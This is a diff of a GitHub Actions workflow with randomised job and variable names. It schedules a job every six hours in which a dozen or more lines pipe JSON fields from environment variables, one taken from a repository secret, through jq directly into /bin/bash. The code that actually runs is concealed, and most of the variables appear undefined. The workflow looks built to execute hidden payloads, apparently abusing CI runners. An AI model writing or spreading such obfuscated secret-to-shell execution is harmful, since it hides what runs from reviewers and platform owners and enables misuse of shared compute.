@@ -1,21 +1,35 @@
 name: xieqianli3765
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 5/6 * * *'
+    - cron: '26 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xieqianli3765
         env:
-          le90121: ${{ secrets.le90121 }}
+          q8634: ${{ secrets.q8634 }}
         run: |
-          echo $le90121 | jq -r .syp9831 | /bin/bash
-          echo $hjcc3 | jq -r .dzga62480 | /bin/bash
-          echo $mcjam68695 | jq -r .mt4457 | /bin/bash
-          echo $wdpir527 | jq -r .mtfg164 | /bin/bash
-          echo $ka6 | jq -r .jtziu5 | /bin/bash
-          echo $x08537 | jq -r .bmjp908 | /bin/bash
+          echo $q8634 | jq -r .quhky47745 | /bin/bash
+          echo $bbj778 | jq -r .hzpqb7484 | /bin/bash
+          echo $rbzb38 | jq -r .fkpm7 | /bin/bash
+          echo $x980 | jq -r .eo3368 | /bin/bash
+          echo $kkvhn917 | jq -r .hmpv5756 | /bin/bash
+          echo $vb52 | jq -r .qkecb9176 | /bin/bash
+          echo $zn1 | jq -r .cdzx6632 | /bin/bash
+          echo $oi195 | jq -r .h82 | /bin/bash
+          echo $of33266 | jq -r .dpshz111 | /bin/bash
+          echo $legk413 | jq -r .pygb1 | /bin/bash
+          echo $eyy28478 | jq -r .gkx594 | /bin/bash
+          echo $oid259 | jq -r .hl2415 | /bin/bash
+          echo $g670 | jq -r .qvpe99509 | /bin/bash
+          echo $vs67 | jq -r .ybiuk1160 | /bin/bash
+          echo $j88702 | jq -r .q73 | /bin/bash
+          echo $ltrq275 | jq -r .unv9810 | /bin/bash
+          echo $hohkg238 | jq -r .t8000 | /bin/bash
 
